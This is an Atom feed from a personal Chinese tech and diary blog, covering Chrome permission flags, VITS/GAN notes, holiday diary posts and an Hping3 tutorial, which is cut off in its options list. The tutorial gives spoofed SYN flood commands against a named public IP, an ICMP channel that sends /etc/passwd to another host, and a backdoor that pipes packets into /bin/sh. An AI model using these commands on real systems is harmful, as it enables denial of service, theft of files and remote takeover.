<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Anthony&#39;s Blog</title>
  
  <subtitle>As you look around</subtitle>
  <link href="https://www.scery.com/atom.xml" rel="self"/>
  
  <link href="https://www.scery.com/"/>
  <updated>2024-12-16T00:48:28.556Z</updated>
  <id>https://www.scery.com/</id>
  
  <author>
    <name>HaoDong Wu</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>精传系统页面权限配置</title>
    <link href="https://www.scery.com/%E7%B2%BE%E5%87%86%E5%9B%BD%E9%99%85%E4%BC%A0%E6%92%AD%E7%B3%BB%E7%BB%9F/%E7%B2%BE%E4%BC%A0%E7%B3%BB%E7%BB%9F%E9%A1%B5%E9%9D%A2%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE.htm"/>
    <id>https://www.scery.com/%E7%B2%BE%E5%87%86%E5%9B%BD%E9%99%85%E4%BC%A0%E6%92%AD%E7%B3%BB%E7%BB%9F/%E7%B2%BE%E4%BC%A0%E7%B3%BB%E7%BB%9F%E9%A1%B5%E9%9D%A2%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE.htm</id>
    <published>2024-12-16T00:48:25.000Z</published>
    <updated>2024-12-16T00:48:28.556Z</updated>
    
    <content type="html"><![CDATA[<ul><li><h3 id="允许Http页面WS连接"><a href="#允许Http页面WS连接" class="headerlink" title="允许Http页面WS连接"></a>允许Http页面WS连接</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">chrome:<span class="regexp">//</span>flags/<span class="comment">#unsafely-treat-insecure-origin-as-secure</span></span><br><span class="line">http:<span class="regexp">//</span><span class="number">172.27</span>.<span class="number">48.26</span>:<span class="number">8000</span>,http:<span class="regexp">//</span><span class="number">172.25</span>.<span class="number">156.61</span>:<span class="number">8000</span></span><br></pre></td></tr></table></figure></li><li><h3 id="允许摄像头和麦克风默认权限"><a href="#允许摄像头和麦克风默认权限" class="headerlink" title="允许摄像头和麦克风默认权限"></a>允许摄像头和麦克风默认权限</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">原来启动浏览器的地址：C:\Users\xxxxx\AppData\Local\Google\Chrome\Application\chrome<span class="selector-class">.exe</span></span><br><span class="line"> <span class="attr">--args</span> <span class="attr">--disable-web-security</span> <span class="attr">--user-data-dir</span>=<span class="string">&quot;d:/chromecache&quot;</span> <span class="attr">--allow-running-insecure-content</span> <span class="attr">--autoplay-policy</span>=no-user-gesture-required</span><br></pre></td></tr></table></figure></li><li><h3 id="允许自动播放权限"><a href="#允许自动播放权限" class="headerlink" title="允许自动播放权限"></a>允许自动播放权限</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">chrome:<span class="regexp">//</span>flags/<span class="comment">#autoplay-policy</span></span><br><span class="line">http:<span class="regexp">//</span><span class="number">172.27</span>.<span class="number">48.26</span>:<span class="number">8000</span>,http:<span class="regexp">//</span><span class="number">172.25</span>.<span class="number">156.61</span>:<span class="number">8000</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <summary type="html">精传系统前端页面Chrome权限配置</summary>
    
    
    
    
    <category term="精准国际传播" scheme="https://www.scery.com/tags/%E7%B2%BE%E5%87%86%E5%9B%BD%E9%99%85%E4%BC%A0%E6%92%AD/"/>
    
  </entry>
  
  <entry>
    <title>VITS</title>
    <link href="https://www.scery.com/VITS.htm"/>
    <id>https://www.scery.com/VITS.htm</id>
    <published>2024-09-16T08:21:08.000Z</published>
    <updated>2024-09-16T08:42:46.469Z</updated>
    
    <content type="html"><![CDATA[<h1 id="VITS"><a href="#VITS" class="headerlink" title="VITS"></a>VITS</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="GAN-生成式对抗网络"><a href="#GAN-生成式对抗网络" class="headerlink" title="GAN(生成式对抗网络)"></a>GAN(生成式对抗网络)</h3><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/2024/09/16/17264749442551.jpg" alt></p><h4 id="图例"><a href="#图例" class="headerlink" title="图例"></a>图例</h4><ul><li>D:判别器</li><li>G:生成器</li><li>z:简单分布</li><li>D和G分别交叉训练<ul><li>当训练D的时候，固定G，直到D能区分是真实的x还是虚假的G(z)</li><li>当训练G的时候，固定D，能够让G生成的fake数据欺骗判别器D<h4 id="生成器和判别器公式"><a href="#生成器和判别器公式" class="headerlink" title="生成器和判别器公式"></a>生成器和判别器公式</h4><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/2024/09/16/17264751004966.jpg" alt><h3 id="VAE-Variational-Auto-encoder-变分自编码器"><a href="#VAE-Variational-Auto-encoder-变分自编码器" class="headerlink" title="VAE(Variational Auto-encoder) 变分自编码器"></a>VAE(Variational Auto-encoder) 变分自编码器</h3></li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;VITS&quot;&gt;&lt;a href=&quot;#VITS&quot; class=&quot;headerlink&quot; title=&quot;VITS&quot;&gt;&lt;/a&gt;VITS&lt;/h1&gt;&lt;h2 id=&quot;前置知识&quot;&gt;&lt;a href=&quot;#前置知识&quot; class=&quot;headerlink&quot; title=&quot;前置知识&quot;&gt;&lt;/a</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>我回来了</title>
    <link href="https://www.scery.com/%E6%88%91%E5%9B%9E%E6%9D%A5%E4%BA%86.htm"/>
    <id>https://www.scery.com/%E6%88%91%E5%9B%9E%E6%9D%A5%E4%BA%86.htm</id>
    <published>2024-04-26T02:39:02.000Z</published>
    <updated>2024-04-26T02:50:40.250Z</updated>
    
    <content type="html"><![CDATA[<h1 id="许久不见，甚是想念"><a href="#许久不见，甚是想念" class="headerlink" title="许久不见，甚是想念"></a>许久不见，甚是想念</h1><h2 id="博客已经好久没有更新了，域名昨日刚刚重新备案和申请了ssl"><a href="#博客已经好久没有更新了，域名昨日刚刚重新备案和申请了ssl" class="headerlink" title="博客已经好久没有更新了，域名昨日刚刚重新备案和申请了ssl"></a>博客已经好久没有更新了，域名昨日刚刚重新备案和申请了ssl</h2><p>由于近期比较忙碌，退役后也陆陆续续回归正轨了，进入人生的下一阶段，感慨万千。</p><h3 id="今年剩下的阶段："><a href="#今年剩下的阶段：" class="headerlink" title="今年剩下的阶段："></a>今年剩下的阶段：</h3><ul><li><del>毕业论文/设计+答辩</del></li><li>毕业典礼</li><li>算法岗实习</li><li>研究生入学</li></ul><p>愿大家顺顺利利，未来可期！<br><br>给大家看一只贱狗：<br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/town/202404261048913.JPG" alt></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;许久不见，甚是想念&quot;&gt;&lt;a href=&quot;#许久不见，甚是想念&quot; class=&quot;headerlink&quot; title=&quot;许久不见，甚是想念&quot;&gt;&lt;/a&gt;许久不见，甚是想念&lt;/h1&gt;&lt;h2 id=&quot;博客已经好久没有更新了，域名昨日刚刚重新备案和申请了ssl&quot;&gt;&lt;a hre</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>大年初四</title>
    <link href="https://www.scery.com/%E5%A4%A7%E5%B9%B4%E5%88%9D%E5%9B%9B.htm"/>
    <id>https://www.scery.com/%E5%A4%A7%E5%B9%B4%E5%88%9D%E5%9B%9B.htm</id>
    <published>2023-01-25T14:02:52.000Z</published>
    <updated>2024-12-16T00:44:28.842Z</updated>
    
    <content type="html"><![CDATA[<h1 id="大年初四"><a href="#大年初四" class="headerlink" title="大年初四"></a>大年初四</h1><h2 id="假期余额不足，已经过了5天了呜呜呜"><a href="#假期余额不足，已经过了5天了呜呜呜" class="headerlink" title="假期余额不足，已经过了5天了呜呜呜"></a>假期余额不足，已经过了5天了呜呜呜</h2><h5 id="今天早上真人cs赢了一瓶洗衣液和奶针不错，就是有点费嘴。"><a href="#今天早上真人cs赢了一瓶洗衣液和奶针不错，就是有点费嘴。" class="headerlink" title="今天早上真人cs赢了一瓶洗衣液和奶针不错，就是有点费嘴。"></a>今天早上真人cs赢了一瓶洗衣液和奶针不错，就是有点费嘴。</h5><h4 id="今天无聊刷了三部韩剧剧评，又把我恋爱脑激发了。"><a href="#今天无聊刷了三部韩剧剧评，又把我恋爱脑激发了。" class="headerlink" title="今天无聊刷了三部韩剧剧评，又把我恋爱脑激发了。"></a>今天无聊刷了三部韩剧剧评，又把我恋爱脑激发了。</h4><iframe src="//player.bilibili.com/player.html?aid=644920671&bvid=BV1GY4y1u7S1&cid=815206879&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe><iframe src="//player.bilibili.com/player.html?aid=480502721&bvid=BV1ZT411m7eY&cid=970872175&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe><iframe src="//player.bilibili.com/player.html?aid=308235093&bvid=BV1pA411d7MK&cid=974163244&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;大年初四&quot;&gt;&lt;a href=&quot;#大年初四&quot; class=&quot;headerlink&quot; title=&quot;大年初四&quot;&gt;&lt;/a&gt;大年初四&lt;/h1&gt;&lt;h2 id=&quot;假期余额不足，已经过了5天了呜呜呜&quot;&gt;&lt;a href=&quot;#假期余额不足，已经过了5天了呜呜呜&quot; class=&quot;he</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>大年初三</title>
    <link href="https://www.scery.com/%E5%A4%A7%E5%B9%B4%E5%88%9D%E4%B8%89.htm"/>
    <id>https://www.scery.com/%E5%A4%A7%E5%B9%B4%E5%88%9D%E4%B8%89.htm</id>
    <published>2023-01-24T11:11:47.000Z</published>
    <updated>2024-12-16T00:48:37.290Z</updated>
    
    <content type="html"><![CDATA[<h1 id="大年初三"><a href="#大年初三" class="headerlink" title="大年初三"></a>大年初三</h1><h2 id="今天的活动没什么我喜欢的，打兵乒球的，桌球的，还有晚上王者荣耀比赛的，除了下午起床去看电影之外。"><a href="#今天的活动没什么我喜欢的，打兵乒球的，桌球的，还有晚上王者荣耀比赛的，除了下午起床去看电影之外。" class="headerlink" title="今天的活动没什么我喜欢的，打兵乒球的，桌球的，还有晚上王者荣耀比赛的，除了下午起床去看电影之外。"></a>今天的活动没什么我喜欢的，打兵乒球的，桌球的，还有晚上王者荣耀比赛的，除了下午起床去看电影之外。</h2><p>今天早上收垃圾换人啦，顺势把一些后端服务修复了，下午4点起床去看《满江红》，看了两个小时，带回汇餐了，还有30多分钟没看，因为吃太多香蕉了，回来马上去厕所喷射了，回来都在吃了（图是别人拍的为什么没对上焦的原因），虾仁猪心。</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241946017.png" alt="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241946017.png"></p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910399.jpg" alt="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910399.jpg"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910400.jpg" alt="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910400.jpg"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910401.jpg" alt="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910401.jpg"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910402.jpg" alt="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910402.jpg"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910404.jpg" alt="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910404.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;大年初三&quot;&gt;&lt;a href=&quot;#大年初三&quot; class=&quot;headerlink&quot; title=&quot;大年初三&quot;&gt;&lt;/a&gt;大年初三&lt;/h1&gt;&lt;h2 id=&quot;今天的活动没什么我喜欢的，打兵乒球的，桌球的，还有晚上王者荣耀比赛的，除了下午起床去看电影之外。&quot;&gt;&lt;a href</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>大年初二</title>
    <link href="https://www.scery.com/%E5%A4%A7%E5%B9%B4%E5%88%9D%E4%BA%8C.htm"/>
    <id>https://www.scery.com/%E5%A4%A7%E5%B9%B4%E5%88%9D%E4%BA%8C.htm</id>
    <published>2023-01-23T01:46:31.000Z</published>
    <updated>2024-03-18T02:51:00.832Z</updated>
    
    <content type="html"><![CDATA[<h1 id="大年初二碎碎念"><a href="#大年初二碎碎念" class="headerlink" title="大年初二碎碎念"></a>大年初二碎碎念</h1><h2 id="早上的篮球技巧赛，下午的桌球赛，与我无瓜，我还要被派去收垃圾🌿"><a href="#早上的篮球技巧赛，下午的桌球赛，与我无瓜，我还要被派去收垃圾🌿" class="headerlink" title="早上的篮球技巧赛，下午的桌球赛，与我无瓜，我还要被派去收垃圾🌿"></a>早上的篮球技巧赛，下午的桌球赛，与我无瓜，我还要被派去收垃圾🌿</h2><p>今天想必是回娘家的回娘家，去外婆家的去外婆家拜年啦，祝大家收多点5块钱人民币的大红包🧧。</p><p>🌿，今天早上要去收垃圾，真尼玛又脏又臭！</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241923803.jpg" alt="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241923803.jpg"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241923805.jpg" alt="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241923805.jpg！"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;大年初二碎碎念&quot;&gt;&lt;a href=&quot;#大年初二碎碎念&quot; class=&quot;headerlink&quot; title=&quot;大年初二碎碎念&quot;&gt;&lt;/a&gt;大年初二碎碎念&lt;/h1&gt;&lt;h2 id=&quot;早上的篮球技巧赛，下午的桌球赛，与我无瓜，我还要被派去收垃圾🌿&quot;&gt;&lt;a href=&quot;#早</summary>
      
    
    
    
    <category term="生活日常" scheme="https://www.scery.com/categories/%E7%94%9F%E6%B4%BB%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="生活日常" scheme="https://www.scery.com/tags/%E7%94%9F%E6%B4%BB%E6%97%A5%E5%B8%B8/"/>
    
    <category term="碎碎文" scheme="https://www.scery.com/tags/%E7%A2%8E%E7%A2%8E%E6%96%87/"/>
    
  </entry>
  
  <entry>
    <title>大年初一</title>
    <link href="https://www.scery.com/%E5%A4%A7%E5%B9%B4%E5%88%9D%E4%B8%80.htm"/>
    <id>https://www.scery.com/%E5%A4%A7%E5%B9%B4%E5%88%9D%E4%B8%80.htm</id>
    <published>2023-01-22T08:44:42.000Z</published>
    <updated>2024-12-16T00:48:10.472Z</updated>
    
    <content type="html"><![CDATA[<h1 id="大年初一"><a href="#大年初一" class="headerlink" title="大年初一"></a>大年初一</h1><h2 id="祝各位新年快乐哈，兔年大吉，升官发财但比不过家里人身体健康重要！"><a href="#祝各位新年快乐哈，兔年大吉，升官发财但比不过家里人身体健康重要！" class="headerlink" title="祝各位新年快乐哈，兔年大吉，升官发财但比不过家里人身体健康重要！"></a>祝各位新年快乐哈，兔年大吉，升官发财但比不过家里人身体健康重要！</h2><p><strong><em>今日活动</em></strong></p><table><thead><tr><th>时间</th><th>活动</th></tr></thead><tbody><tr><td>早上</td><td>游园</td></tr><tr><td>下午</td><td>钩机牌</td></tr><tr><td>晚上</td><td>流浪地球</td></tr></tbody></table><p>​    好久没发过博客了，有空刷刷存在感才行🐰🐰🐰。</p><p>​    在这里的日子过得节特别有年味，毕竟无论到节日布置(灯笼，彩旗，兔子灯饰)、板报设计、手写几十副对联、刷漆等等等都是自己搞的，这也是我在这过的最后一个年啦，虽然活动是强制要求的，每天都有俩活动，但是玩的是其乐融融，重要的是里面的人关系比较单纯，都是出生入死的兄弟。比起在家里的冷冷清清，除了打麻将就是玩电脑抠手机，烟花可能找不到地方买了，除非在乡下。</p><h4 id="不得不说《流浪地球2》差评，就特效能看，剧情一言难尽，期待后天的满江红"><a href="#不得不说《流浪地球2》差评，就特效能看，剧情一言难尽，期待后天的满江红" class="headerlink" title="不得不说《流浪地球2》差评，就特效能看，剧情一言难尽，期待后天的满江红"></a>不得不说《流浪地球2》差评，就特效能看，剧情一言难尽，期待后天的满江红</h4><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20230122172002.png" alt="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20230122172002.png"></p><iframe src="//player.bilibili.com/player.html?aid=393018479&bvid=BV1ad4y1V7wb&cid=971466390&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;大年初一&quot;&gt;&lt;a href=&quot;#大年初一&quot; class=&quot;headerlink&quot; title=&quot;大年初一&quot;&gt;&lt;/a&gt;大年初一&lt;/h1&gt;&lt;h2 id=&quot;祝各位新年快乐哈，兔年大吉，升官发财但比不过家里人身体健康重要！&quot;&gt;&lt;a href=&quot;#祝各位新年快乐哈，兔年大吉</summary>
      
    
    
    
    <category term="生活日常" scheme="https://www.scery.com/categories/%E7%94%9F%E6%B4%BB%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="生活日常" scheme="https://www.scery.com/tags/%E7%94%9F%E6%B4%BB%E6%97%A5%E5%B8%B8/"/>
    
    <category term="碎碎文" scheme="https://www.scery.com/tags/%E7%A2%8E%E7%A2%8E%E6%96%87/"/>
    
  </entry>
  
  <entry>
    <title>Hping3编译安装和使用方法</title>
    <link href="https://www.scery.com/hping3%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95.htm"/>
    <id>https://www.scery.com/hping3%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95.htm</id>
    <published>2021-03-01T00:19:43.000Z</published>
    <updated>2024-03-18T02:51:00.792Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hping3编译安装和使用方法"><a href="#Hping3编译安装和使用方法" class="headerlink" title="Hping3编译安装和使用方法"></a>Hping3编译安装和使用方法</h1><h3 id="基于centos7系统安装过程"><a href="#基于centos7系统安装过程" class="headerlink" title="基于centos7系统安装过程"></a>基于centos7系统安装过程</h3><h4 id="1-安装好组件"><a href="#1-安装好组件" class="headerlink" title="1.安装好组件"></a>1.安装好组件</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">yum -y install tcl tcl-devel libpcap libpcap-devel</span><br><span class="line">ln -s <span class="regexp">/usr/i</span>nclude<span class="regexp">/pcap-bpf.h /u</span>sr<span class="regexp">/include/</span>net/bpf.h</span><br><span class="line">wget http:<span class="regexp">//</span>www.hping.org/hping3-<span class="number">20051105</span>.tar.gz</span><br><span class="line">tar -zxvf hping3-<span class="number">20051105</span>.tar.gz</span><br><span class="line">cd hping3-<span class="number">20051105</span></span><br></pre></td></tr></table></figure><h4 id="2-修改bytesex-h文件-加多一行x86-64支持"><a href="#2-修改bytesex-h文件-加多一行x86-64支持" class="headerlink" title="2.修改bytesex.h文件(加多一行x86_64支持)"></a>2.修改bytesex.h文件(加多一行x86_64支持)</h4><p>不然会报错</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20190401103738521.png" alt="img"></p><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment">#if     defined(__i386__) \</span></span><br><span class="line">        || <span class="keyword">defined</span>(__x86_64__) \</span><br><span class="line">        || <span class="keyword">defined</span>(__alpha__) \</span><br><span class="line">        || (<span class="keyword">defined</span>(__mips__) &amp;&amp; (<span class="keyword">defined</span>(MIPSEL) || <span class="keyword">defined</span> (__MIPSEL__)))</span><br></pre></td></tr></table></figure><h4 id="3-创建好目录"><a href="#3-创建好目录" class="headerlink" title="3.创建好目录"></a>3.创建好目录</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">mkdir <span class="regexp">/usr/</span>local/man</span><br><span class="line">mkdir <span class="regexp">/usr/</span>local<span class="regexp">/man/m</span>an8</span><br></pre></td></tr></table></figure><h4 id="4-编译和安装"><a href="#4-编译和安装" class="headerlink" title="4.编译和安装"></a>4.编译和安装</h4><figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">./configure</span><br><span class="line"><span class="built_in">make</span></span><br><span class="line"><span class="built_in">make</span> install</span><br></pre></td></tr></table></figure><h3 id="可能出现的其他问题"><a href="#可能出现的其他问题" class="headerlink" title="可能出现的其他问题"></a>可能出现的其他问题</h3><h4 id="1-main-c-29-18-fatal-error-pcap-h-No-such-file-or-directoryX"><a href="#1-main-c-29-18-fatal-error-pcap-h-No-such-file-or-directoryX" class="headerlink" title="1.main.c:29:18: fatal error: pcap.h: No such file or directoryX"></a>1.main.c:29:18: fatal error: pcap.h: No such file or directoryX</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span>我们缺少pcap库，安装</span><br><span class="line">yum install -y libpcap libpcap-devel</span><br></pre></td></tr></table></figure><h4 id="2-libpcap-stuff-c-20-21-fatal-error-net-bpf-h-No-such-file-or-directory"><a href="#2-libpcap-stuff-c-20-21-fatal-error-net-bpf-h-No-such-file-or-directory" class="headerlink" title="2.libpcap_stuff.c:20:21: fatal error: net/bpf.h: No such file or directory"></a>2.libpcap_stuff.c:20:21: fatal error: net/bpf.h: No such file or directory</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span>创建一个软链接</span><br><span class="line">ln -sf <span class="regexp">/usr/i</span>nclude<span class="regexp">/pcap-bpf.h /u</span>sr<span class="regexp">/include/</span>net/bpf.h</span><br></pre></td></tr></table></figure><h4 id="3-cannot-find-ltcl"><a href="#3-cannot-find-ltcl" class="headerlink" title="3.cannot find -ltcl"></a>3.cannot find -ltcl</h4><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">//我们需要安装<span class="keyword">tcl</span>库</span><br><span class="line">yum -<span class="keyword">y</span> install <span class="keyword">tcl</span> <span class="keyword">tcl</span>-devel</span><br></pre></td></tr></table></figure><h4 id="4-Can’t-install-the-man-page-usr-local-confd-man-man8-does-not-exist"><a href="#4-Can’t-install-the-man-page-usr-local-confd-man-man8-does-not-exist" class="headerlink" title="4.Can’t install the man page: /usr/local/confd/man/man8 does not exist"></a>4.Can’t install the man page: /usr/local/confd/man/man8 does not exist</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">有可能环境没有<span class="regexp">/usr/</span>local<span class="regexp">/confd/m</span>an8目录，我们可以手动创建此目录，或者自己修改脚本实现(我们需要把INSTALL_MANPATH改为<span class="regexp">/usr/</span>local<span class="regexp">/confd/m</span>an）</span><br></pre></td></tr></table></figure><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><h4 id="1-防火墙测试"><a href="#1-防火墙测试" class="headerlink" title="1.防火墙测试"></a>1.防火墙测试</h4><p>测试防火墙对ICMP包的反应、是否支持<a href="http://man.linuxde.net/traceroute">traceroute</a>、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hping3</span> -S  -c <span class="number">1000000</span> -a <span class="number">10.10.10.10</span> -p <span class="number">21</span> <span class="number">10.10.10.10</span></span><br></pre></td></tr></table></figure><h4 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h4><p>Hping3也可以对目标端口进行扫描。Hping3支持指定TCP各个标志位、长度等信息。以下示例可用于探测目标机的80端口是否开放：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">hping3 -<span class="selector-tag">I</span> eth0  -S <span class="number">192.168</span>.<span class="number">10.1</span> -<span class="selector-tag">p</span> <span class="number">80</span></span><br><span class="line">//其中-<span class="selector-tag">I</span> eth0指定使用eth0端口，-S指定TCP包的标志位SYN，-<span class="selector-tag">p</span> <span class="number">80</span>指定探测的目的端口。</span><br></pre></td></tr></table></figure><h4 id="3-Idle扫描"><a href="#3-Idle扫描" class="headerlink" title="3.Idle扫描"></a>3.Idle扫描</h4><p>Idle扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方式也是有Hping3的作者Salvatore Sanfilippo发明的，目前Idle扫描在Nmap中也有实现。</p><p>该扫描原理是：寻找一台idle主机（该主机没有任何的网络流量，并且IPID是逐个增长的），攻击端主机先向idle主机发送探测包，从回复包中获取其IPID。冒充idle主机的IP地址向远程主机的端口发送SYN包（此处假设为SYN包），此时如果远程主机的目的端口开放，那么会回复SYN/ACK，此时idle主机收到SYN/ACK后回复RST包。然后攻击端主机再向idle主机发送探测包，获取其IPID。那么对比两次的IPID值，我们就可以判断远程主机是否回复了数据包，从而间接地推测其端口状态。</p><h4 id="4-拒绝服务攻击"><a href="#4-拒绝服务攻击" class="headerlink" title="4.拒绝服务攻击"></a>4.拒绝服务攻击</h4><p>使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hping3</span> -I eth0 -a 你的ip -S <span class="number">8.134.53.173</span> -p <span class="number">443</span> -i u1000</span><br><span class="line"><span class="attribute">hping3</span> -c <span class="number">10000</span> -d <span class="number">1200000000</span> -S -w <span class="number">644</span> -p <span class="number">1688</span> --flood --rand-source <span class="number">8.134.53.173</span></span><br></pre></td></tr></table></figure><h4 id="5-文件传输"><a href="#5-文件传输" class="headerlink" title="5.文件传输"></a>5.文件传输</h4><p>Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：</p><figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">hping3 192</span><span class="string">.</span><span class="comment">168</span><span class="string">.</span><span class="comment">1</span><span class="string">.</span><span class="comment">159</span><span class="literal">--</span><span class="comment">listen signature</span> <span class="literal">--</span><span class="comment">safe</span>  <span class="literal">--</span><span class="comment">icmp</span></span><br></pre></td></tr></table></figure><p>监听ICMP包中的签名，根据签名解析出文件内容。</p><p>在发送端使用签名打包的ICMP包发送文件：</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">hping3 192.168.1.108<span class="params">--icmp</span> ?d 100 <span class="params">--sign</span> signature <span class="params">--file</span> <span class="string">/etc/passwd</span></span><br></pre></td></tr></table></figure><p>将<code>/etc/passwd</code>密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。</p><h4 id="6-木马功能"><a href="#6-木马功能" class="headerlink" title="6.木马功能"></a>6.木马功能</h4><p>如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与<a href="http://man.linuxde.net/nc_netcat">netcat</a>的后门功能类似。</p><p>示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。</p><p>在木马启动端：</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">hping3 192.168.10.66<span class="params">--listen</span> signature <span class="params">--safe</span> <span class="params">--udp</span> -p 53 | <span class="string">/bin/sh</span></span><br></pre></td></tr></table></figure><p>在远程控制端：</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="keyword">ls</span> &gt;test.cmd</span><br><span class="line">hping3 192.168.10.44 -p53 -d 100 <span class="params">--udp</span> <span class="params">--sign</span> siganature <span class="params">--file</span> <span class="string">./test.cmd</span></span><br></pre></td></tr></table></figure><p>将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。</p><p>当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。</p><h3 id="hping3选项"><a href="#hping3选项" class="headerlink" title="hping3选项"></a>hping3选项</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">-H <span class="attr">--help</span> 显示帮助。</span><br><span class="line">-v -VERSION 版本信息。</span><br><span class="line">-c <span class="attr">--count</span> count 发送数据包的次数 关于countreached_timeout 可以在hping2.h里编辑。</span><br><span class="line">-<span class="selector-tag">i</span> <span class="attr">--interval</span> 包发送间隔时间（单位是毫秒）缺省时间是<span class="number">1</span>秒,此功能在增加传输率上很重要,在idle/spoofing扫描时此功能也会被用到,你可以参考hping-howto获得更多信息-fast 每秒发<span class="number">10</span>个数据包。</span><br><span class="line">-n -nmeric 数字输出，象征性输出主机地址。</span><br><span class="line">-<span class="selector-tag">q</span> -quiet 退出。</span><br><span class="line">-I <span class="attr">--interface</span> interface name 无非就是eth0之类的参数。</span><br><span class="line">-v <span class="attr">--verbose</span> 显示很多信息，TCP回应一般如：len=<span class="number">46</span> ip=<span class="number">192.168</span>.<span class="number">1.1</span> flags=RADF seq=<span class="number">0</span> ttl=<span class="number">255</span> id=<span class="number">0</span> win=<span class="number">0</span> rtt=<span class="number">0.4ms</span> tos=<span class="number">0</span> iplen=<span class="number">40</span> seq=<span class="number">0</span> 